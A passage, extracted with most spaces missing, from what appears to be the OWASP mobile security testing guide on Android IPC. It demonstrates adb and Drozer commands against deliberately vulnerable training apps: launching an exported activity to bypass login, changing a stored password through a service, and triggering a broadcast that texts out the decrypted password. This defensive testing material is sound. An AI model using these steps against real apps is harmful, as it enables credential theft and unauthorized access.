{"text": "273\\n<?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.mwr.example.sieve\"> ... Thisactivityisexportedviatheattribute\"exported\" <activity android:name=\".FileSelectActivity\" android:exported=\"true\" /> Thisactivityisexportedviathe\"intent-filter\"declaration <activity android:name=\".MainLoginActivity\"> <intent-filter> <action android:name=\"android.intent.action.MAIN\"/> <category android:name=\"android.intent.category.LAUNCHER\"/> </intent-filter> </activity> Thisactivityisexportedviatheattribute\"exported\" <activity android:name=\".PWList\" android:exported=\"true\" /> Activitiesbelowarenotexported <activity android:name=\".SettingsActivity\" /> <activity android:name=\".AddEntryActivity\"/> <activity android:name=\".ShortLoginActivity\" /> <activity android:name=\".WelcomeActivity\" /> <activity android:name=\".PINActivity\" /> ... </manifest> Enumeratingactivitiesinthevulnerablepasswordmanager“Sieve”showsthatthefollowingactivitiesareexported: • .MainLoginActivity • .PWList • .FileSelectActivity Usethecommandbelowtolaunchanactivity: ##Starttheactivitywithoutspecifyinganactionorancategory $adbshellamstart -ncom.mwr.example.sieve/.PWList Starting:Intent{cmp=com.mwr.example.sieve/.PWList} ##Starttheactivityindicatinganaction(-a)andancategory(-c) $adbshellamstart -n\"com.mwr.example.sieve/.MainLoginActivity\" -aandroid.intent.action.MAIN -candroid.intent.category.LAUNCHER Starting:Intent{act=android.intent.action.MAINcat=[android.intent.category.LAUNCHER]cmp=com.mwr.example.sieve/.MainLoginActivity} Sincetheactivity.PWListiscalleddirectlyinthisexample,youcanuseittobypasstheloginformprotectingthepassword manager,andaccessthedatacontainedwithinthepasswordmanager. Services ServicescanbeenumeratedwiththeDrozermoduleapp.service.info: dz>runapp.service.info -acom.mwr.example.sieve Package:com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission:null com.mwr.example.sieve.CryptoService Permission:null Tocommunicatewithaservice,youmustfirstusestaticanalysistoidentifytherequiredinputs. Becausethisserviceisexported,youcanusethemoduleapp.service.sendtocommunicatewiththeserviceandchange thepasswordstoredinthetargetapplication: dz>runapp.service.sendcom.mwr.example.sievecom.mwr.example.sieve.AuthService --msg 63457452 1 --extra stringcom.mwr.example.sieve.PASSWORD ↪ \"abcdabcdabcdabcd\" --bundle-as-obj Gotareplyfromcom.mwr.example.sieve/com.mwr.example.sieve.AuthService: what:4 arg1:42 arg2:0 Empty Broadcast Receivers Tolist broadcastreceiversexportedby an application, you can use thefollowing command and focus onreceiver ele- ments: 274\\n$aaptdxmltreeInsecureBankv2.apkAndroidManifest.xml ... E:receiver (line=88) A:android:name(0x01010003)=\"com.android.insecurebankv2.MyBroadCastReceiver\" (Raw: \"com.android.insecurebankv2.MyBroadCastReceiver\") A:android:exported(0x01010010)=(type0x12)0xffffffff E:intent-filter (line=91) E:action (line=92) A:android:name(0x01010003)=\"theBroadcast\" (Raw: \"theBroadcast\") E:receiver (line=119) A:android:name(0x01010003)=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" (Raw: ↪ \"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\") A:android:exported(0x01010010)=(type0x12)0x0 E:intent-filter (line=122) E:action (line=123) A:android:name(0x01010003)=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\" (Raw: \"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\") ... Youcanidentifyanexportedbroadcastreceiverusingoneofthefollowingproperties: • Ithasanintent-filtersubdeclaration. • Ithastheattributeandroid:exportedsetto0xffffffff. YoucanalsousejadxtoidentifyexportedbroadcastreceiversinthefileAndroidManifest.xmlusingthecriteriadescribed above: <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.android.insecurebankv2\"> ... Thisbroadcastreceiverisexportedviatheattribute\"exported\"aswellasthe\"intent-filter\"declaration <receiver android:name=\"com.android.insecurebankv2.MyBroadCastReceiver\" android:exported=\"true\"> <intent-filter> <action android:name=\"theBroadcast\"/> </intent-filter> </receiver> ThisbroadcastreceiverisNOTexportedbecausetheattribute\"exported\"isexplicitlysettofalse <receiver android:name=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" android:exported=\"false\"> <intent-filter> <action android:name=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\"/> </intent-filter> </receiver> ... </manifest> The above example from the vulnerable banking application InsecureBankv2 shows that only the broadcast receiver namedcom.android.insecurebankv2.MyBroadCastReceiverisexported. Nowthatyouknowthatthereisanexportedbroadcastreceiver,youcandivedeeperandreverseengineertheappusing jadx. Thiswillallowyoutoanalyzethesourcecodesearchingforpotentialvulnerabilitiesthatyoucouldlatertrytoexploit. Thesourcecodeoftheexportedbroadcastreceiveristhefollowing: package com.android.insecurebankv2; ... public class MyBroadCastReceiver extends BroadcastReceiver { public static final StringMYPREFS =\"mySharedPreferences\"; StringusernameBase64ByteString; public void onReceive(Contextcontext,Intentintent){ Stringphn =intent.getStringExtra(\"phonenumber\"); Stringnewpass =intent.getStringExtra(\"newpass\"); if(phn!=null){ try{ SharedPreferencessettings =context.getSharedPreferences(\"mySharedPreferences\",1); this.usernameBase64ByteString =newString(Base64.decode(settings.getString(\"EncryptedUsername\",(String)null),0),\"UTF-8\"); StringdecryptedPassword =newCryptoClass().aesDeccryptedString(settings.getString(\"superSecurePassword\",(String)null)); StringtextPhoneno =phn.toString(); StringtextMessage =\"UpdatedPasswordfrom:\" +decryptedPassword +\"to: \" +newpass; SmsManagersmsManager =SmsManager.getDefault(); System.out.println(\"Forthechangepassword-phonenumber:\" + textPhoneno +\"password is:\" +textMessage); smsManager.sendTextMessage(textPhoneno,(String)null,textMessage,(PendingIntent)null,(PendingIntent)null); }catch (Exceptione){ e.printStackTrace(); } }else { System.out.println(\"Phonenumberisnull\"); } } } As you can see in the source code, this broadcast receiver expects two parameters named phonenumber and newpass. Withthisinformationyoucannowtrytoexploitthisbroadcastreceiverbysendingeventstoitusingcustomvalues: 275\\n##Sendaneventwiththefollowingproperties: ##Actionissetto\"theBroadcast\" ##Parameter\"phonenumber\"issettothestring\"07123456789\" ##Parameter\"newpass\"issettothestring\"12345\" $adbshellambroadcast -atheBroadcast --es phonenumber \"07123456789\" --es newpass \"12345\" Broadcasting:Intent{act=theBroadcastflg=0x400000 (hasextras)} Broadcastcompleted:result=0 ThisgeneratesthefollowingSMS: UpdatedPasswordfrom:SecretPassword@to:12345 Sniffing Intents IfanAndroidapplicationbroadcastsintentswithoutsettingarequiredpermissionorspecifyingthedestinationpackage, theintentscanbemonitoredbyanyapplicationthatrunsonthedevice. Toregisterabroadcastreceivertosniffintents,usetheDrozermoduleapp.broadcast.sniffandspecifytheactionto monitorwiththe--actionparameter: dz>runapp.broadcast.sniff --action theBroadcast [*]Broadcastreceiverregisteredtosniffmatchingintents [*]Outputisupdatedonceasecond.PressControl+Ctoexit. Action:theBroadcast Raw:Intent{act=theBroadcastflg=0x10 (hasextras)} Extra:phonenumber=07123456789 (java.lang.String) Extra:newpass=12345 (java.lang.String)` You can also use the following command to sniff the intents. However, the content of the extras passed will not be displayed: $adbshelldumpsysactivitybroadcasts |grep \"theBroadcast\" BroadcastRecord{fc2f46fu0theBroadcast}touser0 Intent{act=theBroadcastflg=0x400010 (hasextras)} BroadcastRecord{7d4f24du0theBroadcast}touser0 Intent{act=theBroadcastflg=0x400010 (hasextras)} 45:act=theBroadcastflg=0x400010 (hasextras) 46:act=theBroadcastflg=0x400010 (hasextras) 121:act=theBroadcastflg=0x400010 (hasextras) 144:act=theBroadcastflg=0x400010 (hasextras) Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms Platform: android MASVSV1: MSTG-STORAGE-6 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis ThefirststepistolookatAndroidManifest.xmltodetectcontentprovidersexposedbytheapp. Youcanidentifycontent providersbythe<provider>element. Completethefollowingsteps: • Determinewhetherthevalueoftheexporttag(android:exported)is\"true\". Evenifitisnot,thetagwillbesetto \"true\"automaticallyifan<intent-filter>hasbeendefinedforthetag. Ifthecontentismeanttobeaccessed onlybytheappitself,setandroid:exportedto\"false\". Ifnot,settheflagto\"true\"anddefineproperread/write permissions. • Determinewhetherthedataisbeingprotectedbyapermissiontag(android:permission). Permissiontagslimit exposuretootherapps. 276\\n• Determinewhethertheandroid:protectionLevelattributehasthevaluesignature. Thissettingindicatesthat the data is intended to be accessed only by apps from the same enterprise (i.e., signed with the same key). To make the data accessible to other apps, apply a security policy with the <permission> element and set a properandroid:protectionLevel. Ifyouuseandroid:permission,otherapplicationsmustdeclarecorrespond- ing <uses-permission> elements in their manifests to interact with your content provider. You can use the an- droid:grantUriPermissionsattributetograntmorespecificaccesstootherapps;youcanlimitaccesswiththe <grant-uri-permission>element. Inspectthesourcecodetounderstandhowthecontentproviderismeanttobeused. Searchforthefollowingkeywords: • android.content.ContentProvider • android.database.Cursor • android.database.sqlite • .query • .update • .delete ToavoidSQLinjectionattackswithintheapp,useparameterizedquerymethods,suchasquery,update,anddelete. Besuretoproperlysanitizeallmethodarguments;forexample,theselectionargumentcouldleadtoSQLinjection ifitismadeupofconcatenateduserinput. If you expose a content provider, determine whether parameterized query methods (query, update, and delete) are beingusedtopreventSQLinjection. Ifso,makesurealltheirargumentsareproperlysanitized. WewillusethevulnerablepasswordmanagerappSieveasanexampleofavulnerablecontentprovider. Inspect the Android Manifest Identifyalldefined<provider>elements: <provider android:authorities=\"com.mwr.example.sieve.DBContentProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".DBContentProvider\"> <path-permission android:path=\"/Keys\" android:readPermission=\"com.mwr.example.sieve.READ_KEYS\" android:writePermission=\"com.mwr.example.sieve.WRITE_KEYS\" /> </provider> <provider android:authorities=\"com.mwr.example.sieve.FileBackupProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".FileBackupProvider\" /> AsshownintheAndroidManifest.xmlabove,theapplicationexportstwocontentproviders. Notethatonepath(“/Keys”) isprotectedbyreadandwritepermissions.", "metadata": {"doc_id": "OWASP_MASTG", "chunk_id": 104}}